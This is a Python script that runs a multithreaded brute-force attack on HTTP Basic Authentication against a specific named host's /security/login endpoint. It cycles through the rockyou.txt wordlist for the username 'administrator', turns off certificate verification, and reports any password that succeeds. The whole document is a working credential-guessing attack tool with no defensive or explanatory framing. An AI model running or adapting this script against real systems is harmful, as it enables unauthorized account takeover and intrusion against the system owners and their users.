import requests 
import base64
import threading
import concurrent.futures

target_url = "https://dmviewdemo.datacom.com.br:8101/security/login"
username = "administrator"
passwords_file = "rockyou.txt"
contador = 0
found = False
def brute_force(password):

    global contador,found
    if found: 
        return  
    base64_credentials = base64.b64encode(f"{username}:{password}".encode()).decode()

    headers = { "Authorization": f"Basic {base64_credentials}" }

    response = requests.get(target_url, headers=headers, verify=False)

    if response.status_code == 200:

         print(f"Success! Username: {username}, Password: {password}")
         found = True
         return True

    else:
        contador += 1
        print(f"Failed for password: {password}, {contador}")
        return False


def main():
    with open(passwords_file, "r", errors="ignore") as file: 
       passwords = file.read().splitlines()

    max_threads = 10
    with concurrent.futures.ThreadPoolExecutor(max_threads) as executor:
        futures = [executor.submit(brute_force, password) for password in passwords]

        for future in concurrent.futures.as_completed(futures):
            pass
        executor.shutdown(wait=False)

if __name__ == "__main__":
   main()
